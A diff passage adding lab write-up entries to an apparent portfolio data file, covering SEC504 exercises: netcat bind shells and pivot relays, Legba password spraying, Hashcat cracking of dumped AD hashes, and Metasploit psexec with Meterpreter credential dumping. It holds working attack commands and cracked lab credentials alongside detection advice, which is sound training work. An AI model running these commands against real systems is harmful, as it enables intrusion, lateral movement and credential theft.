+        command: "# Linux: nc -l -p 7777 -e /bin/sh\n# Windows: nc 10.10.75.1 7777\nwhoami; id; pwd",
+        commandBreakdown: "-e /bin/sh: bind a shell to the connection",
+        screenshot: "/labs/netcat-110750.png",
+      },
+      {
+        title: "Bind shell on Windows",
+        description:
+          "The same pattern in reverse: nc <ip> 8888 -e cmd.exe on Windows, listener on Linux. Confirmed the host (Sec504Student, Windows 10.0.19044) and dropped into C:\\WINDOWS\\system32. netcat gives a shell on either operating system with the same two commands.",
+        command: "# Windows: nc 10.10.75.1 8888 -e cmd.exe\n# Linux: nc -l -p 8888\necho %username%; hostname; dir",
+        commandBreakdown: "-e cmd.exe: bind the Windows shell",
+        screenshot: "/labs/netcat-111158.png",
+      },
+      {
+        title: "Port-check through a pivot",
+        description:
+          "The attacker's -z scan of 172.30.0.55:80 timed out (no direct route), but from the compromised pivot host at 172.30.0.50 the same scan reported the port open. This establishes that the pivot can reach the target the attacker cannot.",
+        command: "# attacker (fails):\nnc -vvv -z -w3 172.30.0.55 80\n# pivot (succeeds):\nnc -vvv -z -w3 172.30.0.55 80",
+        commandBreakdown: "-z: zero-I/O port scan\n-w3: 3s timeout\n-vvv: verbose",
+        screenshot: "/labs/netcat-111654.png",
+      },
+      {
+        title: "Named-pipe relay and log confirmation",
+        description:
+          "On the pivot, a FIFO makes the relay bidirectional: nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe. The attacker then curls http://172.30.0.50:8080 and gets the target's page (a CTF password). Critically, the target's access log records 172.30.0.50 (the pivot) as the client, not the attacker. The relay launders the source IP.",
+        command: "mkfifo namedpipe\nnc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe\n# attacker:\ncurl http://172.30.0.50:8080",
+        commandBreakdown: "FIFO carries the response back into the first nc, making the relay two-way",
+        screenshot: "/labs/netcat-111913.png",
+      },
+    ],
+    outcome:
+      "Exercised netcat end to end: chat, two-way file transfer, bind shells on Linux and Windows, and a named-pipe relay that pivoted through a compromised host to reach an otherwise-unreachable target. The target's log showed the pivot's IP, demonstrating how a relay hides the attacker's true source.",
+    nextStepsInProduction:
+      "Alert on netcat-style behavior rather than the binary name: outbound connections from server processes, shells spawned by network listeners, and long-lived connections between internal hosts that normally do not talk. Segment networks so a single compromised host cannot relay into sensitive ranges, and treat any host that suddenly proxies traffic (source IP in a target log that does not match the real client) as compromised. Correlate logs across hops so a laundered source IP can be traced back through the pivot.",
+    securityControlsRelevant: [
+      "Egress filtering and detection of shells spawned by listeners",
+      "Network segmentation to limit pivot reach",
+      "Cross-host log correlation to defeat source-IP laundering",
+      "EDR detection of -e shell behavior and FIFO relays",
+    ],
+    keyFindings: [
+      "netcat handled chat, file transfer both ways, and bind shells on Linux and Windows with the same primitives",
+      "A named-pipe relay turned a compromised host into a transparent proxy to an unreachable target",
+      "The target access log recorded the pivot IP (172.30.0.50), not the attacker's",
+      "-z -w3 through the pivot confirmed reachability the attacker lacked directly",
+    ],
+    takeaway: [
+      "The relay is the lesson defenders miss. Once a host is compromised, two netcat processes and a FIFO turn it into a proxy, and the target logs the pivot's address as the client. An analyst who trusts the source IP in that log will investigate the wrong machine entirely. Reading proxied traffic correctly means correlating across hops, not trusting a single log's idea of who connected.",
+      "netcat earns its reputation because it is small, everywhere, and dual-use. Every mode here (transfer, shell, relay) is also a legitimate admin task, so signature-based detection on the binary is weak. The durable detections are behavioral: a service process opening an outbound connection, a shell whose parent is a network listener, or an internal host that suddenly starts relaying traffic it never handled before.",
+    ],
+    screenshots: [
+      { src: "/labs/netcat-105658.png", alt: "Linux ping to target", caption: "Connectivity check from the Linux host" },
+      { src: "/labs/netcat-105706.png", alt: "Windows ping to target", caption: "Connectivity check from the Windows host" },
+      { src: "/labs/netcat-105856.png", alt: "netcat chat client", caption: "Windows client connects to the Linux listener on 2222" },
+      { src: "/labs/netcat-105902.png", alt: "netcat chat listener", caption: "Linux listener receives the typed messages" },
+      { src: "/labs/netcat-110033.png", alt: "File transfer Windows to Linux", caption: "Get-Content piped into nc -l serves the file" },
+      { src: "/labs/netcat-110147.png", alt: "File received on Linux", caption: "nc ... > received.txt captures the transferred file" },
+      { src: "/labs/netcat-110421.png", alt: "Listener with Out-File", caption: "Windows: nc -l -p 4321 | Out-File received2.txt" },
+      { src: "/labs/netcat-110503.png", alt: "Send from Linux", caption: "cat file.txt | nc 10.10.0.1 4321 sends the file back" },
+      { src: "/labs/netcat-110509.png", alt: "File received on Windows", caption: "Get-Content received2.txt confirms the transfer" },
+      { src: "/labs/netcat-110744.png", alt: "Linux bind shell listener", caption: "nc -l -p 7777 -e /bin/sh binds a shell" },
+      { src: "/labs/netcat-110750.png", alt: "Shell into Linux from Windows", caption: "whoami/id in the bound Linux shell shows sec504 group memberships" },
+      { src: "/labs/netcat-111152.png", alt: "Windows bind shell", caption: "nc 10.10.75.1 8888 -e cmd.exe binds the Windows shell" },
+      { src: "/labs/netcat-111158.png", alt: "Shell into Windows from Linux", caption: "hostname/dir in the bound Windows shell (Sec504Student)" },
+      { src: "/labs/netcat-111654.png", alt: "Pivot reachability", caption: "Attacker scan times out; pivot 172.30.0.50 reaches 172.30.0.55:80" },
+      { src: "/labs/netcat-111913.png", alt: "Named-pipe relay and log", caption: "curl through the relay; target log shows the pivot IP, not the attacker" },
+    ],
+  },
+  {
+    id: 30,
+    courseSlug: "sec504",
+    slug: "online-password-attacks-legba",
+    title: "Online Password Attacks with Legba: Stuffing, Dictionary, and Spray",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Password Management & Cryptography",
+    level: "SEC504",
+    date: "Jul 2026",
+    artifacts: "Sanitized Legba output against HTTP Basic, MySQL, and SMB services from the SEC504 lab (172.30.0.0/24)",
+    context:
+      "This lab uses Legba, a modern multi-protocol credential brute-forcer, to run the three distinct online password attacks against the right targets: credential stuffing against HTTP Basic auth, single-user dictionary against MySQL, and password spraying against SMB. The value is the taxonomy: the same tool, different flag combinations, three fundamentally different attacks with different detection profiles.",
+    summary:
+      "Mapped five hosts on 172.30.0.0/24 with nmap, then ran Legba against three. Credential stuffing with a user:pass combo list against HTTP Basic auth on 172.30.0.12 found admin:tiksight in 596 attempts (1.38s). A single-user dictionary attack against MySQL on 172.30.0.64 found root:changeme from the 10k-most-common list. Password spraying against SMB on 172.30.0.155, one password across a username list, found ttidmas:Falsimentis123 and, on a second pass, ptrouel:Falsimentis!. Each attack type used a distinct Legba flag pattern: -C for a combo list, -U user -P wordlist for dictionary, and -U userlist -P singlepassword for spray.",
+    whyThisMatters:
+      "Password spraying is the attack that beats account lockout, because one password tried across many accounts never trips a per-account threshold, and it is how real intrusions get their first valid credential. Knowing the difference between stuffing, dictionary, and spray, and that they look different in the logs, is what lets a defender build the right detection: stuffing and dictionary spike failures on one account, spraying spreads a few failures across many. Legba makes the taxonomy concrete because the flags map directly to the attack shapes.",
+    tldr: [
+      "Legba ran three distinct online attacks: credential stuffing (HTTP Basic), dictionary (MySQL), and spray (SMB)",
+      "Credential stuffing found admin:tiksight in 596 attempts in 1.38s against HTTP Basic auth",
+      "Password spraying (one password, many users) beat lockout and found ttidmas:Falsimentis123 over SMB",
+    ],
+    skillsDemonstrated: [
+      "Multi-protocol online password attacks with Legba",
+      "Credential stuffing with combo lists (-C)",
+      "Single-user dictionary attacks (-U user -P wordlist)",
+      "Password spraying (-U userlist -P single) to evade lockout",
+      "Credential reuse validation across services",
+    ],
+    tools: ["Legba 0.11.0", "Nmap 7.60", "Slingshot Linux", "CLI"],
+    steps: [
+      "Map the subnet and identify services with nmap",
+      "Inspect the available credential and username wordlists",
+      "Credential-stuff HTTP Basic auth with a combo list",
+      "Validate the found credential against MySQL",
+      "Run a single-user dictionary attack against MySQL",
+      "Password-spray SMB with one password across a username list",
+    ],
+    stepDetails: [
+      {
+        title: "Map the targets",
+        description:
+          "nmap found five hosts: 172.30.0.12 (HTTP), .35 (HTTP), .64 (MySQL), .155 (SMB), .185 (SSH+HTTP). Each service maps to a Legba protocol module, so the scan directly determines which attack to run where.",
+        command: "sudo nmap -sT 172.30.0.2-254",
+        commandBreakdown: "Maps services to the Legba protocol modules to target",
+        screenshot: "/labs/legba-115637.png",
+      },
+      {
+        title: "Inspect the wordlists",
+        description:
+          "The lab provided a combo credentials.txt (user:pass pairs like administrator:password), 10k-most-common.txt, falsimentisusernames.txt, and passwords lists. The combo list is for stuffing; the username list plus a single password is for spraying.",
+        command: "cd ~/labs/passwords/\nls -lah\nhead credentials.txt",
+        commandBreakdown: "credentials.txt = combo list; falsimentisusernames.txt = spray user list",
+        screenshot: "/labs/legba-120506.png",
+      },
+      {
+        title: "Credential stuffing against HTTP Basic",
+        description:
+          "172.30.0.12 answered with a browser Basic-auth prompt. Legba with -C fed the combo list against the http.basic module. Despite canary-code warnings, it found admin:tiksight in 596 attempts at ~596 requests/sec, runtime 1.38s.",
+        command: "legba -C credentials.txt -T http://172.30.0.12/ http.basic",
+        commandBreakdown: "-C combo.txt: user:pass pairs\n-T: target\nhttp.basic: protocol module",
+        screenshot: "/labs/legba-120614.png",
+      },
+      {
+        title: "Validate and dictionary-attack MySQL",
+        description:
+          "First validated the found credential against MySQL on 172.30.0.64 with -U/-P single values. Then ran a real dictionary attack: -U root -P 10k-most-common.txt found root:changeme in 9,257 attempts at up to ~5,000 requests/sec (3.29s).",
+        command: "legba -U admin -P tiksight -T 172.30.0.64 mysql\nlegba -U root -P 10k-most-common.txt -T 172.30.0.64 mysql",
+        commandBreakdown: "-U user -P wordlist: single-user dictionary attack",
+        screenshot: "/labs/legba-121048.png",
+      },
+      {
+        title: "Password spraying against SMB",
+        description:
+          "Spraying inverts the flags: -U falsimentisusernames.txt with a single -P password tries one password across every user. -P Falsimentis123 found ttidmas; -P Falsimentis! found ptrouel. Because each account sees only one failed attempt, spraying stays under lockout thresholds that would stop a dictionary attack.",
+        command: "legba -U falsimentisusernames.txt -P Falsimentis123 -T 172.30.0.155 smb\nlegba -U falsimentisusernames.txt -P 'Falsimentis!' -T 172.30.0.155 smb",
+        commandBreakdown: "-U userlist + -P single = spray; one attempt per account evades lockout",
+        screenshot: "/labs/legba-121553.png",
+      },
+    ],
+    outcome:
+      "Ran all three online password attacks with Legba and recovered credentials on each service: admin:tiksight (HTTP Basic, stuffing), root:changeme (MySQL, dictionary), and ttidmas/ptrouel (SMB, spray). The flag patterns made the taxonomy explicit: -C for stuffing, -U user -P list for dictionary, -U list -P single for spray.",
+    nextStepsInProduction:
+      "Detect spraying by correlating a low number of failures across many accounts in a short window, not just per-account thresholds, since spraying is designed to stay under lockout. Enforce MFA so a single valid password is not sufficient, and kill weak/default passwords (changeme, seasonal patterns) with a password filter and breached-password screening. Rate-limit and alert on HTTP Basic and SMB authentication failures, and disable HTTP Basic in favor of a real auth flow.",
+    securityControlsRelevant: [
+      "MFA to defeat single-credential compromise",
+      "Spray detection (failures spread across many accounts)",
+      "Breached-password and weak-password screening",
+      "Authentication rate limiting on HTTP Basic, MySQL, SMB",
+      "Account lockout tuned against spray, not just brute force",
+    ],
+    keyFindings: [
+      "Credential stuffing found admin:tiksight over HTTP Basic in 596 attempts (1.38s)",
+      "Dictionary attack found root:changeme over MySQL from the 10k-common list",
+      "Password spraying found ttidmas:Falsimentis123 and ptrouel:Falsimentis! over SMB",
+      "Spray's one-attempt-per-account shape evades lockout that stops dictionary attacks",
+    ],
+    takeaway: [
+      "Spraying is the attack worth internalizing. A dictionary attack hammers one account and trips lockout; a spray tries one password across hundreds of accounts and each one sees a single failure, so nothing locks. That is why real intrusions start with a spray of a common seasonal password: it is quiet, it beats lockout, and it only needs to work once. Per-account thresholds do not catch it; cross-account correlation does.",
+      "The three attacks look different in the logs, and that is the defensive hook. Stuffing and dictionary concentrate failures on one identity; spraying spreads a handful of failures across many. A detection tuned only for repeated failures on a single account is blind to the exact attack most likely to succeed. Legba makes this concrete because the same tool, with three flag patterns, produces three distinct log signatures.",
+    ],
+    screenshots: [
+      { src: "/labs/legba-115637.png", alt: "nmap subnet map", caption: "Five hosts: HTTP (.12/.35), MySQL (.64), SMB (.155), SSH+HTTP (.185)" },
+      { src: "/labs/legba-120220.png", alt: "HTTP Basic auth prompt", caption: "172.30.0.12 presents a browser Basic-auth challenge" },
+      { src: "/labs/legba-120506.png", alt: "Credential wordlists", caption: "credentials.txt combo list plus username and password lists" },
+      { src: "/labs/legba-120614.png", alt: "Credential stuffing result", caption: "legba -C found admin:tiksight in 596 attempts (1.38s)" },
+      { src: "/labs/legba-120751.png", alt: "Credential validation vs MySQL", caption: "Validating the found credential against MySQL" },
+      { src: "/labs/legba-121048.png", alt: "Dictionary attack vs MySQL", caption: "legba -U root -P 10k-most-common found root:changeme" },
+      { src: "/labs/legba-121553.png", alt: "Password spray vs SMB", caption: "legba -U userlist -P Falsimentis123 found ttidmas over SMB" },
+      { src: "/labs/legba-121653.png", alt: "Second spray pass", caption: "-P 'Falsimentis!' found ptrouel; spray stays under lockout" },
+    ],
+  },
+  {
+    id: 31,
+    courseSlug: "sec504",
+    slug: "offline-password-cracking-hashcat",
+    title: "Offline Password Cracking with Hashcat: Shadow Files and Active Directory NTDS",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Password Management & Cryptography",
+    level: "SEC504",
+    date: "Aug 2026",
+    artifacts: "Sanitized Hashcat output against Linux shadow hashes and an extracted Active Directory NTDS.dit from the SEC504 lab (CPU-only)",
+    context:
+      "This lab works the Hashcat attack-mode ladder against two real hash sources: Linux shadow-file hashes and an Active Directory NTDS.dit dumped with secretsdump.py. It moves from identifying hash types, through a straight dictionary attack, to a mask attack against a known password pattern, to a rule-based attack, and shows why rules give the best value per second. All CPU-only, which makes the speed differences between attack modes obvious.",
+    summary:
+      "Identified Linux hashes with hashcat --identify (descrypt 1500, md5crypt 500, sha256/512crypt), then cracked them with a dictionary attack, recovering beva:Spring23, jorestes:Qwertyu1, and hrio:12345678, using --show --username to display results and --left to list what remained. For the AD side, secretsdump.py extracted NTDS.dit; awk revealed all 2,258 accounts shared the empty LM hash (aad3b435b51404eeaad3b435b51404ee), and sed stripped machine accounts. A dictionary attack against the NTLM hashes recovered 46/1,845 (Password1-4, Welcome1, seasonal patterns). A mask attack (?u?l?l?l?l?l?l?d) pushed it to 95/1,845, and a best64 rule attack reached 105/1,845 in four seconds, beating the six-minute mask run.",
+    whyThisMatters:
+      "Offline cracking is what happens after a hash dump, and the results here are a direct readout of password policy: the cracked passwords were seasonal patterns and Password1 through Password4, which no wordlist invents, they exist because policy allowed them. The attack-mode ladder matters because rules turned 44,488 words into 3.4 million candidates in four seconds and out-cracked a mask attack that ran for six minutes. For a defender, the lesson is that the crack rate is set by your password policy, not by the attacker's wordlist.",
+    tldr: [
+      "hashcat --identify plus the attack-mode ladder cracked Linux shadow and Active Directory NTLM hashes",
+      "All 2,258 AD accounts shared the empty LM hash; cracked NTLM passwords were Password1-4 and seasonal patterns",
+      "A best64 rule attack cracked 105/1,845 in 4 seconds, beating a 6-minute mask run: rules give the best value",
+    ],
+    skillsDemonstrated: [
+      "Hash identification (hashcat --identify, autodetect)",
+      "Dictionary, mask, and rule-based attack modes (-a 0/-a 3/-r)",
+      "NTDS.dit extraction with secretsdump.py",
+      "Result management (--show, --left, --username)",
+      "Reading crack results as a password-policy audit",
+    ],
+    tools: ["Hashcat 6.2.5", "secretsdump.py (Impacket)", "awk", "sed", "Slingshot Linux"],
+    steps: [
+      "Identify the Linux shadow hash types",
+      "Run a dictionary attack and show cracked results with usernames",
+      "List the hashes that remain uncracked",
+      "Extract NTLM hashes from NTDS.dit with secretsdump.py",
+      "Analyze the LM hashes and strip machine accounts",
+      "Dictionary-attack the NTLM hashes",
+      "Escalate with a mask attack, then a rule-based attack",
+    ],
+    stepDetails: [
+      {
+        title: "Identify the hash types",
+        description:
+          "hashcat --identify returned four candidate modes for the shadow file (descrypt 1500, md5crypt 500, sha256crypt 7400, sha512crypt 1800). The /etc/passwd-style lines throw a token-length exception, which is expected: those lines have no crackable hash.",
+        command: "hashcat slingshot.hashes --identify",
+        commandBreakdown: "--identify: list candidate -m modes for the input",
+        screenshot: "/labs/hashcat-201301.png",
+      },
+      {
+        title: "Dictionary attack and show results",
+        description:
+          "A straight dictionary attack (-a 0 -m 1500) against the descrypt hashes, then --show --username to display the cracked pairs: beva:Spring23, jorestes:Qwertyu1, hrio:12345678. --show reads the potfile so results survive between runs.",
+        command: "hashcat -a 0 -m 1500 slingshot.hashes /usr/share/wordlists/passwords.txt\nhashcat -m 1500 slingshot.hashes --show --username",
+        commandBreakdown: "-a 0: dictionary\n--show: print cracked from potfile\n--username: include the account",
+        screenshot: "/labs/hashcat-201712.png",
+      },
+      {
+        title: "List what remains",
+        description:
+          "--left prints the hashes still uncracked (lrenate, rkaede, asayaka, alucasta), which tells you exactly where to point the next, more expensive attack instead of re-running the whole set.",
+        command: "hashcat -m 1500 slingshot.hashes --left --username",
+        commandBreakdown: "--left: show hashes not yet in the potfile",
+        screenshot: "/labs/hashcat-201801.png",
+      },
+      {
+        title: "Extract NTLM hashes from NTDS.dit",
+        description:
+          "secretsdump.py parsed the extracted Active Directory database and SYSTEM hive locally, writing NTLM hashes (with history). This is the offline-cracking input that matters most in a domain compromise: every account's password hash in one file.",
+        command: "secretsdump.py -system registry/SYSTEM -ntds \"Active Directory/ntds.dit\" LOCAL -outputfile w99 -history",
+        commandBreakdown: "LOCAL: parse offline files\n-history: include password history",
+        screenshot: "/labs/hashcat-202411.png",
+      },
+      {
+        title: "Analyze LM hashes and strip machine accounts",
+        description:
+          "awk on the LM-hash column showed all 2,258 accounts share aad3b435b51404eeaad3b435b51404ee, the empty LM hash, which means LM is disabled (good). sed then stripped machine accounts (names ending in $) so the crack focuses on user passwords.",
+        command: "cat w99.ntds | awk -F: '{print $3}' | sort | uniq -c\nsed -i '/\\$/d' w99.ntds",
+        commandBreakdown: "awk $3: the LM hash column\nsed '/$/d': drop machine accounts",
+        screenshot: "/labs/hashcat-202544.png",
+      },
+      {
+        title: "Dictionary, then mask, then rules",
+        description:
+          "Autodetect resolved the hashes as NTLM (mode 1000). A dictionary attack cracked 46/1,845 (Password1-4, Welcome1, seasonal). A mask attack (?u?l?l?l?l?l?l?d, an 8-char Upper+6lower+digit pattern) reached 95/1,845 but took six minutes. A best64 rule attack cracked 105/1,845 in four seconds, expanding 44,488 words into 3.4 million candidates. Rules gave the best value by a wide margin.",
+        command: "hashcat -a 0 w99.ntds /usr/share/wordlists/passwords.txt\nhashcat -a 3 w99.ntds ?u?l?l?l?l?l?l?d\nhashcat -a 0 w99.ntds /usr/share/wordlists/passwords.txt -r /opt/hashcat/rules/best64.rule",
+        commandBreakdown: "-a 0 dictionary\n-a 3 mask (?u upper ?l lower ?d digit)\n-r rules: mangle each word",
+        screenshot: "/labs/hashcat-203823.png",
+      },
+    ],
+    outcome:
+      "Cracked Linux shadow hashes and Active Directory NTLM hashes with the full Hashcat attack-mode ladder. The AD results were a password-policy readout: Password1 through Password4, Welcome1, and seasonal patterns. A best64 rule attack cracked 105/1,845 hashes in four seconds, out-performing a six-minute mask run.",
+    nextStepsInProduction:
+      "Treat the crack results as a policy audit: ban Password1-style and seasonal patterns with a password filter and screen against breached-password lists, because those are what cracked. Enforce length over complexity (passphrases resist dictionary+rule attacks far better than 8-char patterns), and deploy MFA so a cracked hash is not game over. Confirm LM is disabled everywhere (the empty LM hash here shows it was) and protect NTDS.dit and the SYSTEM hive as the crown-jewel files they are.",
+    securityControlsRelevant: [
+      "Password filters banning seasonal and Password<N> patterns",
+      "Breached-password screening",
+      "Length-based policy (passphrases) over 8-char complexity",
+      "MFA to blunt cracked-credential impact",
+      "NTDS.dit / SYSTEM hive protection and access monitoring",
+    ],
+    keyFindings: [
+      "All 2,258 AD accounts shared the empty LM hash (aad3b435b51404eeaad3b435b51404ee): LM disabled",
+      "Dictionary attack cracked 46/1,845 NTLM: Password1-4, Welcome1, seasonal patterns",
+      "Mask attack (?u?l?l?l?l?l?l?d) reached 95/1,845 in ~6 minutes",
+      "best64 rule attack reached 105/1,845 in 4 seconds (44,488 words -> 3.4M candidates)",
+      "Cracked passwords were policy artifacts, not wordlist inventions",
+    ],
+    takeaway: [
+      "The crack rate is a readout of your password policy, not the attacker's skill. Password1 through Password4 and Autumn2020 are not in any clever wordlist by accident, they are there because rules generate exactly the patterns that a complexity policy permits and users reach for. If those crack, the fix is a password filter and length requirements, not a better firewall.",
+      "The attack-mode ladder has a clear winner. A dictionary attack is cheap but shallow; a mask attack is precise but slow when you guess the pattern; rules are the sweet spot, turning 44,488 words into 3.4 million candidates in four seconds and out-cracking a six-minute mask run. Understanding that ordering is what lets an analyst estimate how exposed a given hash set really is, and how fast.",
+    ],
+    screenshots: [
+      { src: "/labs/hashcat-201301.png", alt: "hashcat --identify", caption: "Four candidate modes for the shadow file (descrypt, md5crypt, sha256/512crypt)" },
+      { src: "/labs/hashcat-201509.png", alt: "Dictionary attack start", caption: "hashcat -a 0 -m 1500 against the shadow hashes (CPU-only)" },
+      { src: "/labs/hashcat-201610.png", alt: "Cracked shadow passwords", caption: "Spring23, Qwertyu1, 12345678 recovered" },
+      { src: "/labs/hashcat-201712.png", alt: "--show --username", caption: "beva:Spring23, jorestes:Qwertyu1, hrio:12345678" },
+      { src: "/labs/hashcat-201801.png", alt: "--left uncracked", caption: "Remaining uncracked hashes to target next" },
+      { src: "/labs/hashcat-201948.png", alt: "md5crypt dictionary run", caption: "md5crypt (-m 500): 3/6 recovered, Status Exhausted" },
+      { src: "/labs/hashcat-202411.png", alt: "secretsdump.py NTDS", caption: "secretsdump.py extracts NTLM hashes from NTDS.dit" },
+      { src: "/labs/hashcat-202544.png", alt: "LM hash analysis", caption: "All 2,258 accounts share the empty LM hash aad3b435b51404ee..." },
+      { src: "/labs/hashcat-202647.png", alt: "Strip machine accounts", caption: "sed -i '/$/d' removes machine accounts (names end in $)" },
+      { src: "/labs/hashcat-203402.png", alt: "NTLM autodetect", caption: "Autodetect resolves the hashes as mode 1000 (NTLM)" },
+      { src: "/labs/hashcat-203417.png", alt: "Dictionary crack of NTLM", caption: "46/1,845 cracked: Password1-4, Welcome1, seasonal patterns" },
+      { src: "/labs/hashcat-203638.png", alt: "Mask attack progress", caption: "Mask ?u?l?l?l?l?l?l?d reaches 95/1,845 in ~6 minutes" },
+      { src: "/labs/hashcat-203823.png", alt: "Rule-based attack", caption: "best64 rules: 105/1,845 in 4 seconds, 3.4M candidates" },
+    ],
+  },
+  {
+    id: 32,
+    courseSlug: "sec504",
+    slug: "post-exploitation-metasploit-meterpreter",
+    title: "Post-Exploitation with Metasploit and Meterpreter",
+    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
+    role: "Solo, Lab",
+    focus: "Incident Response",
+    level: "SEC504",
+    date: "Aug 2026",
+    artifacts: "Sanitized msfconsole and Meterpreter session output from the SEC504 lab against a Windows 10 target",
+    context:
+      "This lab runs the full Metasploit workflow against a Windows target using psexec: search for a module, configure it, get a session, and then work post-exploitation inside Meterpreter (situational awareness, process migration, and credential dumping). The key framing is that psexec is authenticated code execution, valid credentials are the exploit, which is why it matters so much that credentials leak in the earlier labs.",
+    summary:
+      "In msfconsole (v6.4.74), searched for psexec modules and selected exploit/windows/smb/psexec. Set RHOSTS, SMBUser, SMBPass, and LHOST, and ran it: authenticated as sec504, executed the payload, and opened Meterpreter session 1 as NT AUTHORITY\\SYSTEM on SEC504STUDENT. Backgrounded and re-entered the session, then ran post-exploitation: sysinfo and systeminfo for host detail, getuid confirming SYSTEM, ps for the process list, getpid showing the current PID (6056), and migrate -N lsass.exe to move into a stable, always-running process (which also switched the session to x64). Finished with hashdump, recovering the local SAM NTLM hashes including the empty-password hash on the built-in accounts.",
+    whyThisMatters:
+      "psexec is not a memory-corruption exploit; it is authenticated user code execution, which means the valid credentials recovered in the SMB and password labs are the exploit. Process migration into lsass.exe is the move that makes a session survive and matches the target architecture, and hashdump is how one compromised host becomes credentials for the next. Understanding this chain from the defender's side is what connects a leaked password to full domain-adjacent compromise.",
+    tldr: [
+      "psexec is authenticated code execution: valid credentials are the exploit, opening a SYSTEM Meterpreter session",
+      "migrate -N lsass.exe moved into a stable process and switched the session to x64",
+      "hashdump recovered local NTLM hashes, turning one compromised host into credentials for the next",
+    ],
+    skillsDemonstrated: [
+      "Metasploit module search, selection, and configuration",
+      "Credentialed exploitation with psexec",
+      "Meterpreter session management (background, sessions, interact)",
+      "Post-exploitation situational awareness (sysinfo, ps, getuid)",
+      "Process migration and credential dumping (hashdump)",
+    ],
+    tools: ["Metasploit 6.4.74", "Meterpreter", "psexec", "Windows 10", "Slingshot Linux"],
+    steps: [
+      "Search for psexec modules and read the module info",
+      "Select the module and set RHOSTS, SMBUser, SMBPass, LHOST",
+      "Run the exploit and open a Meterpreter session",
+      "Background and re-enter the session; confirm SYSTEM",
+      "Gather host detail with sysinfo and systeminfo",
+      "List processes and migrate into lsass.exe",
+      "Dump local credentials with hashdump",
+    ],
+    stepDetails: [
+      {
+        title: "Search and select the module",
+        description:
+          "search type:exploit psexec listed the psexec family, including smb_relay (MS08-068), ms17_010_psexec (EternalBlue and friends), and the plain smb/psexec authenticated module. info showed it is Privileged: Yes, Rank: Manual, and offers PowerShell/Native/MOF/Command targets. This is authenticated code execution, not a CVE exploit.",
+        command: "search type:exploit psexec\nuse exploit/windows/smb/psexec\ninfo",
+        commandBreakdown: "type:exploit filters the search; info shows options and targets",
+        screenshot: "/labs/metasploit-205613.png",
+      },
+      {
+        title: "Configure and run",
+        description:
+          "Set RHOSTS (the target), SMBUser/SMBPass (the credentials, which are the actual exploit), and LHOST (the callback). exploit authenticated as sec504, selected the PowerShell target, and sent the payload.",
+        command: "set RHOSTS 10.10.0.1\nset SMBUser sec504\nset SMBPass sec504\nset LHOST 10.10.75.1\nexploit",
+        commandBreakdown: "SMBUser/SMBPass = the credentials that make psexec work",
+        screenshot: "/labs/metasploit-210313.png",
+      },
+      {
+        title: "Confirm the session and SYSTEM",
+        description:
+          "The exploit opened Meterpreter session 1. background dropped back to the console; sessions listed it as NT AUTHORITY\\SYSTEM @ SEC504STUDENT; sessions 1 re-entered it. sysinfo confirmed Windows 10 21H2 in the SEC504 domain. Sessions are backgroundable and re-enterable, which is how an operator juggles multiple hosts.",
+        command: "background\nsessions\nsessions 1\nsysinfo",
+        commandBreakdown: "background/sessions/interact: session management; already SYSTEM",
+        screenshot: "/labs/metasploit-210458.png",
+      },
+      {
+        title: "Situational awareness",
+        description:
+          "execute -if systeminfo pulled full host detail (VMware, patch level, 6 hotfixes). getuid confirmed NT AUTHORITY\\SYSTEM. ps listed every process with PID, PPID, user, and path, which is what you read before deciding where to migrate.",
+        command: "execute -if systeminfo\ngetuid\nps\ngetpid",
+        commandBreakdown: "getuid: current context\nps: process list for a migration target",
+        screenshot: "/labs/metasploit-210728.png",
+      },
+      {
+        title: "Migrate into lsass.exe",
+        description:
+          "The initial session was x86 with PID 6056. migrate -N lsass.exe moved into the LSASS process; sysinfo afterward reported x64/windows. Migration does two things: it hides the session inside a critical always-running process, and it matches the host architecture so 64-bit post-exploitation tooling works.",
+        command: "getpid\nmigrate -N lsass.exe\nsysinfo",
+        commandBreakdown: "-N <name>: migrate by process name; also fixes x86 -> x64",
+        screenshot: "/labs/metasploit-210938.png",
+      },
+      {
+        title: "Dump local credentials",
+        description:
+          "hashdump read the local SAM: Administrator, DefaultAccount, Guest (all showing the empty-password NTLM hash 31d6cfe0...), plus the Sec504 and WDAGUtilityAccount hashes. This is how a single host compromise becomes credentials to attack the next one.",
+        command: "hashdump",
+        commandBreakdown: "31d6cfe0d16ae931b73c59d7e0c089c0 = empty-password NTLM hash",
+        screenshot: "/labs/metasploit-211023.png",
+      },
+    ],
+    outcome:
+      "Ran the full Metasploit-to-Meterpreter workflow: selected psexec, authenticated with valid credentials, opened a SYSTEM session, gathered situational awareness, migrated into lsass.exe (moving to x64 and a stable process), and dumped local NTLM hashes. Every step reinforced that credentials, not a CVE, were the exploit.",
+    nextStepsInProduction:
+      "Because psexec relies on valid admin credentials over SMB, the defenses are credential-centric: enforce LAPS so local admin passwords are unique per host (preventing pass-the-hash reuse), restrict which accounts can authenticate over SMB to which hosts, and enable Credential Guard to protect LSASS from hashdump. Alert on service creation via SMB (the psexec technique), on remote 4624/4672 logons by admin accounts, and on process access to lsass.exe.",
+    securityControlsRelevant: [
+      "LAPS (unique local admin passwords) to stop hash reuse",
+      "Credential Guard / LSASS protection against hashdump",
+      "Restricting SMB admin authentication by account and host",
+      "Detection of remote service creation (psexec technique)",
+      "Alerting on lsass.exe process access and remote admin logons",
+    ],
+    keyFindings: [
+      "psexec opened a session as NT AUTHORITY\\SYSTEM using valid credentials, not an exploit",
+      "Meterpreter sessions are backgroundable and re-enterable by ID",
+      "migrate -N lsass.exe moved into a stable process and switched the session to x64",
+      "hashdump recovered local NTLM hashes incl. the empty-password hash 31d6cfe0...",
+    ],
+    takeaway: [
+      "psexec reframes what an exploit is. There is no CVE here, no memory corruption; the module authenticates with a username and password and runs code because that is what those credentials are allowed to do. This is exactly why the earlier credential-leak labs matter: a password found in an SMB share or cracked from a hash dump is a working exploit against every host that trusts it. The vulnerability is credential reuse, not a patchable bug.",
+      "Migration into lsass.exe is the quiet, important move. It hides the session inside a process that can never be killed without crashing the host, and it aligns the session architecture with the target so full tooling works. For a defender, process access to lsass is a high-value detection: it is both where attackers hide and where they dump credentials, so monitoring it catches two techniques at once.",
+    ],
+    screenshots: [
+      { src: "/labs/metasploit-205447.png", alt: "msfconsole banner", caption: "Metasploit 6.4.74 with 2,533 exploits loaded" },
